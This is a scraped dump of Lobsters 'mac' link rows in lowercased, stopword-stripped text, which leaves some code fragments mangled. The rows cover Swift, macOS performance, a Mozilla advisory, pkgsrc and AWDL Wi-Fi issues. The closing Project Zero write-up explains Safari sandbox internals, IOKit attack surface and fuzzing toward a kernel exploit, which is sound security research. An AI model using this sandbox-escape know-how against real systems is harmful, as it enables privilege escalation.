effort put source mapping api auditing argument made cocoa become something liability build new foundation swift standard library would differently could learn mistake past may seem odd thesis nshipster site founded upon great deal affection objectivec cocoa one worth exploring close historic year apple developer let take moment look forward possibility going forward seen standing shoulder giant isaac newton owe productivity standard library done well standard library provide common implementation useful programming construct clarify concept transferable way language standard library diverges existing even internal convention thing go south example nsurlcomponents conforms rfc fact made explicit documentation api consumer osmotically absorb proper terminology concept byproduct usage newcomer api already familiar rfc hit ground running much easier write documentation rtfm link spec standard library implement standard talk technology intuitive usually mean familiar standard ietf iso body common ground new standard library built based assertion let take look specific example cocoa new swift standard library could improve number nsnumber exists purely object wrapper around integer float double boolean primitive without concern swift practical role construct swift standard library done remarkable job structuring numeric primitive clever combination toplevel function operator type hierarchy bonus point including literal binary octal hexadecimal addition decimal lack real complaint currently suggestion might added string peril string encode many different kind information written previously string perhaps versatile data type computing passed around symbol used encode numeric value associate value key represent resource path store linguistic content format information nsstring perhaps versatile though although handle unicode like champ entire api burdened conflation string path stringbyappendingpathcomponent ilk genuinely useful usefulness ultimately stem misappropriation string url much due fact string literal much convenient nsurl urlwithstring constructor however swift literal convertible easy build url path value one truly clever design choice swift string internal use encodingindependent unicode character exposed view specific encoding collection code unit accessed string property collection code unit accessed string property collection unicode scalar value equivalent string encoding form accessed string unicodescalars property one complaint swift string much functionality hampered way functionality hidden toplevel function developer trained type wait method completion something like count le obvious consult toplevel countelements function described default protocol implementation article could solved either xcode swift allowed automatic bridging explicit implicit self function uri url urn ideal url implementation would valuetype ie struct implementation nsurlcomponents would take aforementioned pathrelated apis currently nsstring something along line clear implementation uri scheme according rfc could mitigate conflation file file url currently nsurl nice implementation urn according rfc would wonder getting developer realize urn uris url urn relate one another transferrable skill data structure swift functional data structure generator sequence collection well beautiful use array dictionary literal syntactic sugar strike fine balance interesting underlying contour standard library building strong primitive remarkably easy create productionready implementation data structure undergraduate computer science curriculum armed wikipedia spare afternoon pretty much anyone could least get close amazing swift standard library provided canonical implementation bunch eg tree singly doublylinked list queue stack make case one set three big collection foundation nsarray nsdictionary nsset mutable counterpart set one currently missing fundamental data structure applicable wide variety use case specifically swift though set could resolve one awkward corner consideration nate cook built nice complete implementation set date time calendaring functionality oldest robust cocoa whereas language date time programming cause fear one get sense dread working nsdate nscalendar however suffers difficult use impossible extend order calendaring calculation getting date one month today one would use nscalendar nsdatecomponents correct way majority developer probably still use datewithtimeintervalsincenow constant number second hardcoded tragically enough api thing right way must also easier wrong way another shortfall albeit incredibly minor nscalendar allow new calendar added someone darnedest advocate conversion french republican calendar bothersome fortunately new language feature swift could used solve problem really elegant way take work implement calendaring system based generic could really something anyone want take challenge idea interchange format one astonishing thing objectivec long took standard way working json io o x lion developer hoping work popular interchange format new web service forced choose one handful mutually incompatible thirdparty library however nsjsonserialization miserable experience swift repeating history new crop thirdparty alternative swift objectivec let data nsdata var error nserror nil let json nsjsonserializationjsonobjectwithdata data option nil error error nsdictionary product json product nsarray let name string product name string let price double product price double nsdata data nserror error nil id json nsjsonserialization jsonobjectwithdata data error error error id product json product nsstring name product name nsnumber price product price defense apple asked engineer wwdc lab took long io support json answer made lot sense paraphrasing apple company long view technology really difficult tell whether technology like json going stick another fad apple released framework pubsub despite widely known used still supported foreseeable future technology gamble engineering resource data marshaling serialization boring task boring task exactly standard library take care apple knew developing cocoa robust implementation text binary property list lifeblood io o x may difficult anticipate interchange format viable long term providing official support emerging technology probationary basis would lot improve thing developer regular expression regexes staple scripting often dedicated syntax literal swift ever move cocoa would welladvised include successor nsregularexpression wrapper error objectivec rather exceptional us error pointer nserror communicate runtime failure rather throwing exception pattern every cocoa developer familiar nserror error nil bool success nsfilemanager defaultmanager moveitematpath pathtotarget topath pathtodestination error error success nslog error parameter error workaround fact objectivec single return value something go wrong nserror instance populated new object detail issue swift pattern unnecessary since method return tuple optional value error instead func moveitematpath string topath string bool nserror even take thing step define generic result type associated value success failure case struct error public enum result case success case failure error using new pattern error handling enforced compiler order exhaust possible case httpclientgetuser result switch result case success let user success case failure let error failure pattern like emerged community eager improve existing pattern pure swift setting would helpful standard library codify useful pattern order create shared vocabulary elevates level discourse among developer appkit uikit appkit uikit entire topic unto much likely two would take step unify rewritten adapted swift anytime soon much interesting question whether swift expand beyond purview io o x development system web scripting would fundamentally change role cocoa de facto standard library thinking perhaps thinking small standard library wolfram language mother demo apology douglas engelbart programming language granted wolfram parallel universe computation nothing else exists language hot mess overview functionality offered standard library visualization graph analysis data analytics image processing audio processing machine learning equation solving algebraic computation arbitrary precision calculus computation matrix computation string manipulation combinatorial optimization computational geometry database connectivity builtin testing device connectivity functional programming natural language understanding sequence analysis time series geographic data geomapping weather data physic chemistry data genomic data unit measure control theory reliability analysis parallel computation engineering data financial data financial computation socioeconomic data popular culture data boolean computation number theory document generation table formatting mathematical typesetting interactive control interface building form construction xml templating conventional wisdom would suggest yes unreasonable standard library encode production budget movie avatar max speed mcdonnell douglas hornet shape france information retrieved querying imdb scraping wikipedia importing gi system thing like converting mile kilometer clustering value knowing size thing would generally useful variety different application indeed set cocoa apart standard library specific information encodes nslocale nscalendar come unicode common locale data repository cldr stop standard library pulling data source expose interface libphonenumber expand healthkit already fundamental unit incorporating kind data organized meaningful way much expect thirdparty framework important delegate free market open source yes many way question role standard library question role public private sector society thirdparty libertarian meet thirdparty librarytarians swift compelling term language mean apple io o x developer developer community large many factor play question technical feasibility extricated social economic consequence swift released open source license swift unseat javascript viable web scripting language adding interpreter safari ultimately kind deciding factor become swift standard library swift become portable system scripting language would first need extricate objectivec runtime web heavy dependency almost certain however cocoa like objectivec doomed much question whether talking year one really arguing objectivec cocoa going away entirely swift standard library collision course cocoa new language continues gain momentum one expect see fracturing reinvention within system framework year technology served u well best honor contribution learn mistake make sure replaces insanely great
689,Lobsters,mac,Apple macOS,Performance decline OS X Tiger -> Yosemite,http://vimeo.com/115309653,performance decline o x tiger yosemite,,quick unscientific comparison one tiny aspect ui performance o x yosemite v o x tiger although one example personally see kind hiccup throughout o x constantly machine running o x tiger actually intel core duo pc hackintosh hardware accelerated graphic support o x unsupported intel integrated graphic chipset never used real mac hence unsupported graphic therefore tiger demo running without qe ci machine running o x yosemite late inch retina mbp automatic graphic switching disabled demo forcing machine use much powerful nvidia graphic card also power adapter plugged system nt low power state using o x year used hackintoshes custom built compatible hardware machine ran tiger leopard snow leopard lion mountain lion maverick got rmbp primary machine first ran maverick upgraded yosemite year experience performance machine noticeably declined since release lion term ui performance rmbp running mavericksyosemite nowhere near responsive snow leopard machine finger crossed wwdc focus major speed stability improvement o x io new feature great cost performance
690,Lobsters,mac,Apple macOS,The future of interface building in Cocoa,https://dirk.to/blog/2014/12/18/future-of-interface-building.html,future interface building cocoa,lot stylesheets appkit uikit interface builder isolation mode curse interactivity mvvm way forward ibdesignable ibinspectable computed property,methodology building interface cocoa changed lot past year tension side buildinginterfacesthroughcode side buildinginterfacesthroughinterface builder former give far immediate control interface appear sort stuff price really long hairy view code hundred line verbose boilerplate code filled integer constant layout math pretty sight attempt reduce cssinspired stylesheets configuring interface layout system appkit uikit different html dom adaptation really feel natural work well alternative course use interface builder apple want however interface builder long big clunky system prone weird behavior also best navigation worked like adobe illustrator one easily navigate hierarchical document double click extremelyuseful isolation mode curse interactivity compound struggle must toss fact interface must interactive introduces whole new set demand build interface interfacesthroughcode approach requires throw even minutiafilled animation code interface builderbased approach requires wade arcane animation system neither appealing prospect furthermore interface accept andor present information fromto external source must add glue code handle shuffling data interface backend data system people tried declutter mvvm approach far seems ended multiplying amount glue code introducing extra complexity opportunity bug andor confusion deal model view model view controller view lot layer onion probably going cause lot tear way forward good news apple seems making great stride simplifying whole setup first new ibdesignable ibinspectable system allow far powerful interface construction closer tiein see interface builder write code user ultimately experience application truly great second powerful new computed property functionality swift using lot recently bridge gap data view controller data visual interface instead complicated glue code view class whole viewmodel sitting use computed property getter setter view class view controller interacts computed property providing clear separation concern view controller backend data layer view frontend presentation layer muchsimplified version arrangement class viewcontroller func doingsomething bar bazobject viewbar bar func doingsomethingelse let bar viewbar greatcomplexity bar class view get return bar baz textfieldtext set bar textfieldtext barbaz compared clunky glue code past feel like breath fresh spring air could bring sort straightforward controllerview connection clean code environment looking html javascript
691,Lobsters,mac,Apple macOS,Apple's dropping the ball,https://dirk.to/blog/2014/12/12/apple-dropping-the-ball.html,apple dropping ball,hour update friend slowest directory merge handy reference io upgrade problem yosemite upgrade problem continually broken gmail support apple mail,yesterday morning around began updating computer o x yosemite update completed morning around hour apple product updating operating system spinning disk definitely overnight sort operation incremental update reasonably wellengineering system running fast solid state drive think take hour right twentyfive hour update sort thing would expect microsoft window crappy spinning disk mac o x solid state hardware ridiculous fact vaguely remember updating window taking afternoon sure sometimes start went bed got night use restroom find finished updating long ago cause discovered investigation tweet friend quite possibly slowest directory merge history file system performed usrlocal directory directory checked directory machine approximately million file since work lot different thing widely varying dependency mine quite big however modestlysized usrlocal directory still causing massive hiccup upgrade process developer happening merging directory hard fact apple engineer happen upon post handy reference unix tool need reinvent wheel especially wheel farcically slow even saddening another stumble increasingly long litany stumble apple io upgrade problem yosemite upgrade problem continually broken gmail support apple mail issue indicative ongoing problem within apple sufficient engineering capacity adequately work maintain evergrowing range product service stumble continue unless apple figure hiring management quality assurance address underlying capacity problem
692,Lobsters,mac,Apple macOS,Apple CoreGraphics framework on OS X 10.10 logging input data to /tmp directory,https://www.mozilla.org/en-US/security/advisories/mfsa2014-90/,apple coregraphics framework o x logging input data tmp directory,mozilla foundation security advisory apple coregraphics framework o x logging input data tmp directory description kent howard reference,mozilla foundation security advisory apple coregraphics framework o x logging input data tmp directory announced december reporter kent howard impact high product firefox firefox esr thunderbird fixed firefox firefox esr thunderbird description security researcher kent howard reported apple issue present o x yosemite log file created coregraphics framework o x tmp local directory log file contain record input mozilla program operation version o x version coregraphics logging ability turned default o x logging turned default application use custom memory allocator jemalloc initialization bug framework issue addressed mozilla product explicitly turning framework logging input event vulnerable system issue result private data usernames password inputed data saved log file local system issue affect o x user prior user o x go tmp folder delete file name beginning cglog followed name mozilla product cglogfirefox reference
693,Lobsters,mac,Apple macOS,Trim Enabler and Yosemite,http://www.cindori.org/trim-enabler-and-yosemite/,trim enabler yosemite,getting back o x follow step disable kextsigning rebuild kext cache step step step step step step step step step trim enabled,getting back o x follow step disable kextsigning rebuild kext cache step boot recovery mode holding cmdr boot step volume encrypted filevault first open disk utility menu bar unlockmount drive step open terminal menu bar step run command nvram bootargs say skip step say error getting variable continue step step run command nvram step reboot back recovery mode step run command replacing disk name name mac disk volume volume name contains space use quote around touch volume disk name systemlibraryextensions kextcache u volume disk name step wait finish take long minute abort reboot back o x trim enabled
694,Lobsters,mac,Apple macOS,Using pkgsrc on Mac OS X,http://www.cambus.net/using-pkgsrc-on-mac-os-x/,using pkgsrc mac o x,using pkgsrc mac o x pkgsrc netbsd pkgsrc xcode command line tool fetching extracting latest pkgsrc stable release bootstrapping pkgsrc building package keeping pkgsrc uptodate installing ca certificate installing ca certificate netbsd using binary package joyent package repository final word fink homebrew pkgsrcse,using pkgsrc mac o x pkgsrc given netbsd focus portability logical pkgsrc also available system netbsd including darwin mac o x note showing bootstrap pkgsrc unprivileged mode mean everything easily installed user home directory starting need install xcode command line tool get working compiler fetching extracting latest pkgsrc stable release create pkgsrc directory cd wget http ftpnetbsdorgpubpkgsrcstablepkgsrctxz tar xfz pkgsrctxz bootstrapping pkgsrc launching bootstrap script setting abi cd pkgsrcbootstrap bootstrap compilerclang unprivileged create start populating pkg directory built package installed complete list available option bootstrap h bootstrap command bootstrap h bootstrap started sat sep cest usage bootstrap abi binarykit tarball binarymacpkg pkg compiler compiler full gzipbinarykit tarball help mkfragment mkconf pkgdbdir pkgdbdir pkginfodir pkginfodir pkgmandir pkgmandir preferpkgsrc listyesno prefix prefix preservepath quiet sysconfdir sysconfdir unprivileged ignoreusercheck varbase varbase workdir workdir adding pkg path export path path pkgbin pkgsbin fetching security vulnerability information pkgadmin fetchpkgvulnerabilities adding acceptable license pkgsrc configuration echo acceptablelicenses vimlicense pkgetcmkconf building package build package clean working directory dependency cd pkgsrccategorypackage bmake install clean cleandepends keeping pkgsrc uptodate first need build cv cd pkgsrcdevelscmcvs bmake install clean cleandepends update pkgsrc using following command cd pkgsrc cv update dp checking security vulnerability package installing ca certificate cd pkgsrcsecuritymozillarootcerts bmake install clean cleandepends mozillarootcerts install detail please read following post installing ca certificate netbsd using binary package prefer using binary package please check joyent package repository final word running fink mac mini homebrew since late macbook pro nice explore alternative especially since mutually exclusive fact nice idea combine pkgsrc homebrew get best world access even package lastly comprehensive searchable database package please check excellent pkgsrcse
695,Lobsters,mac,Apple macOS,"OmniSharp - Making cross-platform .NET a reality, and a pleasure",http://www.hanselman.com/blog/OmniSharpMakingCrossplatformNETARealityAndAPleasure.aspx,omnisharp making crossplatform net reality pleasure,announcing net net open source net mac linux visual studio community omnisharp video channel like http githubcomomnisharp http wwwomnisharpnet jonathan channon great overview blog post jason imison omnisharpserver omnisharp nancy sublime kulture package kestrel example new aspnet design time host jonathan writeup great animated gifs showing feature yeoman generator aspnet http omnisharpnet hosting,case missed make sure read announcing net net open source net mac linux visual studio community big stuff going summary net wave awesomeness thing wanted talk newly organized group technology called omnisharp sure confusion omnisharp nt microsoft project two microsoft folk team working community member official capacity launched project talk connect miniconference new york week back watch video channel like however technology around omnisharp around year like decade team community pulled together bunch project plugins got organized created http githubcomomnisharp http wwwomnisharpnet jonathan channon great overview blog post check talk jason imison created omnisharpserver http wrapper around nrefactory allowing c editor plugins written language nrefactory c analysis library used sharpdevelop monodevelop ides allows application easily analyze syntax semantics c program quite similar microsoft roslyn project except full compiler nrefactory analyzes c code generate il code omnisharp run process run local nancybased web api editor choice talk editor like use get involved make plugin perhaps eclipse plugins editor sublime bracket adobe atom github emacs vim work far platform choice wanted bring autocomplete basically think typed editor instead want actual typesmart intellisense well sophisticated feature like refactoring format document lot stuff expect see visual studio also brought sublime kulture package give sublime user support aspnet formerly aspnet vnext launch kestrel libuv based local webserver run entity framework migration arbitrary command within sublime omnisharp running emacs window machine emacs setup example little complex others also give emacs folk extreme level control note launch omnisharp server manually emacs launch automatically editor aspnet mvc app running sublime sublime omnisharp package output seen debug console ctrl see omnisharp active development looking bringing roslyn using new aspnet design time host improving robustness perfect pretty darn cool lot detail jonathan writeup great animated gifs showing feature also note yeoman generator aspnet get started creating aspnet apps mac linux yeoman generator create console apps mvc apps nancyfx apps get started http omnisharpnet see hosting
696,Lobsters,mac,Apple macOS,Apple OS X 10.10.1 vs. Ubuntu 14.10 Performance,http://www.phoronix.com/vr.php?view=21179,apple o x v ubuntu performance,o x yosemite preview benchmark phoronix test suite openbenchmarkingorg,delivered o x yosemite preview benchmark back august first test official release apple o x compared ubuntu linux test done o x o x ubuntu utopic unicorn running benchmark gcc llvm clang compiler o x maverick o x yosemite benchmarked apple macbook air used basis test o x release tested see performance compare two latest version apple o x comparing ubuntu ubuntu tested stock form using gcc compiler second run switching packaged llvm clang compiler apple us llvm clang default xcode development environment ubuntu linux us gcc build environment default thus tested ubuntu compiler try rule large performance swing attributed compiler setting maintained default tested operating system macbook air used testing equipped intel core haswell processor base frequency turbo core two physical core plus hyper threading system memory apple ssd intel hd graphic haswellult graphic benchmark carried o x ubuntu linux facilitated fully automated reproducible manner using opensource phoronix test suite benchmarking software benchmark chosen openbenchmarkingorg execution phoronix test suite limited test known reasonable comparable crossplatform state let see o x running ubuntu linux day
697,Lobsters,mac,Apple macOS,WiFried: iOS 8 WiFi Performance Issues,https://medium.com/@mariociabarra/wifried-ios-8-wifi-performance-issues-3029a164ce94,wifried io wifi performance issue,wifried io wifi issue bonjour awdl please bonjour apple confirmed severe wifi degradation issue still occurs io osx fixed background awdl awdl work channel time device service happen discoveryd reproducing wifi performance issue wifi jitteryslow transfer speed reproduce issue iphone added slow ping ssh bug reproduce issue airdrop everyone v contact v bouncing wifireassociating wifi fix io wifi http githubcommariociabarrawifried one last yosemite wifi issue fix continues turning awdl apple user choice http hacker wanted quantum metric mariociabarra linkedin indepth look awdl yosemite,wifried io wifi issuethanks alisaa suggestion wavy baconbonjour awdl please nothere many internet forum thousand user scratching head wondering reason wifi performance severely degraded io router dns setting please help folk need reset network setting morei narrowed issue use apple wireless direct link awdl used airdrop airplay gaming connectionsi go limb say wifi issue apple choice using bonjour awdl given constraint wifi hardware difficult get right perhaps crazy bug fixed appleapple keep bonjour bluetooth connected wifi network really justifiable gain advertising browsing service wifi v bluetooth missed something need work without interferencei confirmed severe wifi degradation issue stilloccurs io osx fixedbackgroundwhat awdl awdl apple wireless direct link low latencyhigh speed wifi peerto peerconnection apple us everywhere expect airdrop gamekit also us bluetooth airplay perhaps elsewhere work using dedicated network interface typically service like instant hotspot bluetooth tethering course gamekit advertise service bluetooth sdp apple decided advertise airdrop wifi inadvertently destroyed wifi performance million yosemite io usershow awdl work since iphone io kernel multiple wifi interface wifi broadcom hardware primary wifi access point interface used wifi apple wireless direct link interface since io multiple interface apple able standard wifi connection still broadcasting browsing resolving peer peer connection well channel time one time wifi chip communicate one frequency thus interface would need channel attempting use interface time typically work well device near likely connected access point using channeli test device connected different channel one one still able airdrop successfully impressive albeit obvious transfer chunking normal transfer rate device device service happen discoveryddiscoveryd previously named mdnsresponder load plugins located systemlibraryprivateframeworksdevicetodevicemanagerframeworkplugins specific one causing issue plugins one wifi one bluetooth mentioned service instant hotspot broadcast bluetooth interface others airdrop airplay gamekit may broadcast multiple interface including bluetooth awdl course standard wifi interfacesreproducing wifi performance issueswifi jitteryslow transfer speedsthe performance degradation bigger two symptom understood look simple addressfix long journey get herewhen device advertising browsing service interference wifi transmission perhaps kind tdma wifi chip support multiple interface performance effect apparent easy reproduceios wifi performance issue comparison videoeffects awdl io wifi performanceto reproduce issue iphoneperform speed test many apps choose simply pull open control center cause discoveryd process browse advertise service wifi interface see immediate reduction wifi speed continue minute two awdl interface continues browseadvertise occurs bluetooth turned well turned appear bluetooth coexistence issue bluetooth wifi overlap frequency case also use chip even interesting cause issue nearby device instead opening control center speed testing device successfully induced wifi issue simply waking nearby io device waking process begin browse advertise service affect nearby added reproduce turn airdrop begin speed test secondary device open photo app choose photo press action icon bottom left see wifi severely degradeslow ping ssh bug iphone consistently see ping time go second every ping yes care ping much affect performance jb community believe folk referring ssh bug issue causing second delay every key interestingly send data often ping latency go away ie type pretty quickly long period connection fast press key second notice second delay keythis issue occurs kernel disables awdl seems odd system log show kernel domonitortimer disabling awdl due service idle linkto reproduce issue iphone easiest way reproduce pingssh issue set airdrop control center pull open close control center wait second phone screen best performing activity io device nearby least bluetooth seems awdl remain around longer device present per kernel log statement system log specific environmental factor made narrowing root cause difficult sure caused issued apple trying locate issue wellonce problem begin go away time service advertised browsed resolved layman term open control center ping time go back normal closed another second kernel disables awdl airdrop everyone v contact v offthere specific nuance surrounding whether airdrop set advertise one contact everyone however despite choose issue still remains different sequencestime periodsetcbouncing wifireassociating wifipart confusion fix due fact io device reconnects ap either turn offon wifi phone forgetreconnect awdl characteristic resetdisabled period timethus wifi performance restores upon wifi bounce discoveryd begin browseadvertise routine causing performance degradation ping lag issue kernel disables awdl againuntil figured made quite difficult troubleshooting fix io wifihow often actually use airdrop play game nearby device airplay directly another device connected wifi used airdrop cool enjoyed worth wifi issue causingi created disable feature conveniently located airdrop menu located control center jailbroken pick cydia free called wifried wifried allow enabledisable conveniently turned offon airdrop setting control centeri post source github shortlyedit http githubcommariociabarrawifriedone last wifi issue fixthis issue root cause severe wifi performance degradation affecting user yosemite continues although airdrop introduced osx lion used awdl release io perhaps sharing bad new code airdrop awdl active since io yet issue seems suddenly appeared io rpetrich mentioned airdrop used two incompatible identically named protocol yosemiteios perhaps change continuity introduced bug areaturning awdlperhaps surprising apple user actually easily see turn awdlairdrop yosemite remove left side finder fix issue apple user choice either way fix yosemite wifi issue cost disabling awdl airdrop typing following command osx terminal sudo ifconfig downand vice versa restore airdrop awdl wifi issue sudo ifconfig upfor clarification w lowercase l number zero update older mac smacbooks may interface yosemite due hardware incompatibility based http look like full airdrop probably support awdlmore hacker wanted reversed io related framework trial error determined mostly kerneldriver issue much io userland code except initiation advertising browsing resolving glanced yosemite version detail work inclined fire ida take look following framework perhaps able figure ciabarra cofounder ceo quantum metric life wife kid beautiful colorado spring mariociabarra linkedindecember update indepth look awdl yosemite
698,Lobsters,mac,Apple macOS,pwn4fun Spring 2014 - Safari - Part II,http://googleprojectzero.blogspot.com/2014/11/pwn4fun-spring-2014-safari-part-ii.html,spring safari part ii,part mandatory access control trustedbsd osxreverser wikipedia article unix phylogenetic tree research microkernel cmu mach interface generator devicesdefs apple developer documentation userclient ida pro smep smap rop address space layout randomisation corefoundation devicetree kuncexecute,posted ian beer tl dr o x gpu driver trusted usersupplied kernel c object pointer called virtual function iokit registry contained kernel pointer used defeat kaslr kernel rop payload ran calculatorapp root using convenient kernel api overview part finished part ability load native library safari renderer process o x exploiting integer truncation bug safari javascript engine part ii take look sandboxing work o x revise o x fundamental exploit two kernel bug launch calculatorapp running root inside safari sandbox safari process model safari sandboxing model based privilege separation us framework communicate multiple separate process collectively form safari browser process responsible different part browser sandboxed allow access system resource requires specifically safari split four distinct process family webprocesses renderers responsible actually drawing web page well dealing active web content javascript networkprocess process talk network pluginprocesses process host native plugins like adobe flash uiprocess unsandboxed parent process responsible coordinating activity sandboxed process webpage actually displayed user interact web network plugin process family sandboxed order understand break webprocess find first got understand sandbox implemented o x sandboxing primitive o x us mandatory access control mac paradigm implement sandboxing specifically us trustedbsd framework use mac sandboxing paradigm implies whenever sandboxed process try acquire access system resource example opening file creating network socket o first check particular process right implementation sandboxing using trustedbsd two part firstly hook must added kernel code wherever sandboxing decision required trustedbsd hook look like bsdkernuipcsyscallsc int socket struct proc p struct socketargs uap retval configmacfsocketsubset error macsocketcheckcreate kauthcredget uap domain uap type uap protocol return error endif macsocketsubset snippet code implementation socket syscall o x mac support enabled compile time first thing socket syscall implementation call macsocketcheckcreate passing credential calling process domain type protocol requested socket securitymacsocketh int macsocketcheckcreate kauthcredt cred int domain int type int protocol int error macsocketenforce return maccheck socketcheckcreate cred domain type protocol return error see enforcement mac socket globally disabled macsocketenforce variable exposed sysctl interface function fall maccheck macro securitymacinternalh define maccheck check args macpolicyliststaticmax mpc macpolicylistentries mpc mpc mpcops mpo check null error macerrorselect mpc mpcops mpo check args error macro core trustedbsd macpolicylistentries first highlighted chunk list policy second highlighted chuck trustedbsd consulting policy actual fact policy nothing c struct struct policyops containing function pointer one per hook type consultation policy simply mean calling right function pointer struct policy function return implemented policy mac check succeeds policy function return nonzero value mac check fails case socket hook syscall fail passing error code back userspace rest socket syscall executed second part implementation sandboxing using trustedbsd provision policy module although trustedbsd allows multiple policy module present time practice o x one implemented kernel extension sandboxkext loaded sandboxkext register policy trustedbsd passing pointer policyops structure trustedbsd add macpolicylistentries array seen earlier call sandboxkext whenever sandboxing decision required sandboxkext o x sandbox policyops paper dionysus blazakis talk meder kydyraliev reference osxreverser go great detail sandboxkext operation usage summarizing linked resource every process unique sandbox profile almost every mac hook type sandboxkext allows sandbox profile specify decision tree used determine whether mac check pas fail decision tree expressed simple schemelike dsl built tuples action operation filter complete guide syntax refer linked doc action operation filter action determine whether particular rule corresponds passing failing mac check action literal allow deny operation define mac hook rule applies example fileread operation allows restricting read access file filter allow granular application operation example filter applied fileread operation could define specific file allowed snippet webprocess sandbox profile illustrate deny default partialsymbolication allow fileread basic system path subpath librarydictionaries subpath libraryfonts subpath libraryframeworks subpath librarymanaged preference subpath libraryspeechsynthesizers regex privateetc hostsgrouppasswd see sandbox profile readable o x usually quite clear particular sandbox profile allows denies example profile using regular expression define allowed file path small regex matching engine kernel applematchkext sandboxkext also mechanism allows userspace program ask policy decision main use restrict access system ipc service access mediated kernel nowhere put mac hook userspace daemon launchd enumerating attack surface sandboxed process broadly speaking two aspect consider enumerating attack surface reachable within particular sandbox o x action specifically allowed sandbox policy easy enumerate looking sandbox policy file action allowed either sandboxkext policyops implement hook callback hook place safari webprocess sandbox profile located systemlibrarystagedframeworkssafariwebkitframeworkversionsaresourcescomapplewebprocesssb profile us import statement load content systemlibrarysandboxprofilessystemsb us define statement declare various broad sandboxing rulesets define rule required use complete o x subsystem graphic networking amongst others webprocesssb profile us systemgraphics defined systemsb define systemgraphics allow iokitopen iokitconnection ioaccelerator iokituserclientclass ioaccelerationuserclient iokituserclientclass iosurfacerootuserclient iokituserclientclass iosurfacesendright tell u webprocess sandbox pretty much unrestricted access gpu driver order understand iokituserclientclass actually mean give u access step back take look various part o x involved operation device driver o x kernel fundamental o x wikipedia article contains detailed taxonomic discussion o x place unix phylogenetic tree purpose sufficient divide o x kernel three broad subsystem collectively known xnu bsd majority o x syscalls bsd syscalls bsdderived code responsible thing like file system networking mach originally research microkernel cmu mach responsible many lowlevel idiosyncrasy o x mach ipc mechanism one fundamental part o x mach kernel code also responsible thing like virtual memory management mach handful dedicated mach syscalls mach call trap almost exist support mach ipc system interaction mach kernel subsystem userspace via mach ipc iokit iokit framework used writing device driver o x iokit code written c brings whole host new bug class exploitation possibility return detailed discussion iokit later mach ipc want change permission memory mapping process talk device driver render system font symbolize crash dump debug another process determine current network connectivity status o x behind scene really sending receiving mach message order find exploit bug thing important understand mach ipc work message port queue mach terminology little unclear time o x ship man page mach apis view online fundamentally mach ipc messageoriented protocol message sent via mach ipc known mach message sending mach message really mean message get enqueued kernelmaintained message queue known mach port one process dequeue message particular port mach terminology process receiveright port multiple process enqueue message port process hold sendrights port within process send receive right called mach port name mach port name used index perprocess mapping mach port name message queue akin processlocal unix file descriptor map actual file diagram see process pid mach port name important notice mach port name meaning within process see kernel structure process key map pointer message queue process pid try dequeue message using mach port name kernel us index process map mach port find correct message queue dequeue message mach message single mach message four part message header header mandatory specifies port name send message well various flag kernel processed descriptor optional section contain multiple descriptor part message need interpreted kernel inline data inline binary payload audit trailer message receiver request kernel append audit trailer received message simple mach message containing descriptor sent first copied entirely kernel heapallocated buffer kernel pointer copy appended correct mach message queue process receive right queue dequeues message kernel copy message get copied receiving process outofline memory copying large message kernel slow especially message large order send large amount data use outofline memory descriptor enables message sender instruct kernel make copyonwrite virtual memory copy buffer receiver process message dequeued bidirectional message mach ipc fundamentally unidirectional order build twoway ipc mechanism mach ipc allows message carry port right mach message along binary data also send mach port right mach ipc quite flexible come sending port right process use localport field mach message header use port descriptor use oolports descriptor multitude flag control exactly right transferred new right created send operation common use makesend flag creates sends new send right port hold receive right bootstrapping mach ipc fundamental bootstrapping problem mach ipc get send right port another process receive right without first sending message thus encountering problem reverse one way around could allow mach port inherited across fork akin setting pipe parent child process using socketpair however unlike file descriptor mach port right inherited across fork implement system except mach port inherited across fork special mach port one bootstrap port parent process o x launchd one role set default bootstrap port inherited every child launchd launchd hold receiveright bootstrap port play role bootstrap server allowing process advertise named sendrights process look o x mach ipc service mig point see kernel userspace mach ipc system use hack get bootstrapped able send binary data get raw mach ipc mig mach interface generator provides simple rpc remote procedure call layer top raw mach message ipc mig used mach kernel service many userspace service mig interface declared defs file use simple interface definition language define function prototype simple data structure mig tool compiles defs c code implement required argument serializationdeserialization calling mig rpc completely transparent like calling regular c function ever programed mac almost certainly used mig generated header file iokit mentioned earlier iokit framework kernel subsystem used device driver interaction iokit begin iokit master port another special mach port allows access iokit registry devicesdefs relevant mig definition file apple developer documentation describes iokit registry great detail iokit registry allows userspace program find available hardware furthermore device driver expose interface userspace implementing userclient main way userspace actually interacts iokit driver userclient via ioconnectmethod mig rpc type array type iostructinbandt array char routine ioconnectmethod connection ioconnectt selector scalarinput inbandinput iostructinbandt oolinput machvmaddresst oolinputsize machvmsizet inbandoutput iostructinbandt countinout scalaroutput countinout ooloutput machvmaddresst inout ooloutputsize machvmsizet method wrapped iokituser library function ioconnectcallmethod kernel implementation mig api iouserclientcpp function isioconnectmethod kernreturnt isioconnectmethod ioconnectt connection selector scalarinput machmsgtypenumbert scalarinputcnt iostructinbandt inbandinput machmsgtypenumbert inbandinputcnt machvmaddresst oolinput machvmsizet oolinputsize iostructinbandt inbandoutput machmsgtypenumbert inbandoutputcnt scalaroutput machmsgtypenumbert scalaroutputcnt machvmaddresst ooloutput machvmsizet ooloutputsize check iouserclient connection client ioexternalmethodarguments args argsselector selector argsscalarinput scalarinput argsscalarinputcount scalarinputcnt argsstructureinput inbandinput argsstructureinputsize inbandinputcnt argsscalaroutput scalaroutput argsscalaroutputcount scalaroutputcnt argsstructureoutput inbandoutput argsstructureoutputsize inbandoutputcnt ret client externalmethod selector args see code fill ioexternalmethodarguments structure argument passed mig rpc call externalmethod method iouserclient happens next depends structure driver iouserclient subclass driver override externalmethod call straight driver code typically selector argument ioconnectcallmethod would used determine function call subclass override externalmethod free implement whatever method dispatch mechanism want however driver subclass override externalmethod iouserclient implementation call gettargetandmethodforindex passing selector argument method iouserclient subclass override return pointer ioexternalmethod structure struct ioexternalmethod ioservice object iomethod func iooptionbits flag iobytecount iobytecount driver simple implementation gettargetandmethodfortype us selector argument index array ioexternalmethod structure structure contains pointer method invoked since c actually function pointer pointertomembermethod mean thing get fun get control see bug report project zero bugtracker example flag member used define mixture input output type externalmethod support field define number size byte input output argument various shim function make sure func called correct prototype depending declared number type argument putting together point know call ioconnectcallmethod really happens c code autogenerated mig serializes argument data buffer wrapped mach message sent mach port received received iokit registry knew talk every process special device port message get copied kernel mig generated c code deserializes call isioconnectmethod call driver externalmethod virtual method writing iokit fuzzer auditing code alongside manual analysis often worth writing fuzzer soon understood attackercontrolled data could enter system write simple piece code throw randomness knowledge code improves make incremental improvement fuzzer allowing explore code deeply ioconnectcallmethod perfect example api applies easy write simple fuzzer make random ioconnectcallmethod call one approach slightly improve using randomness try mutate real data case 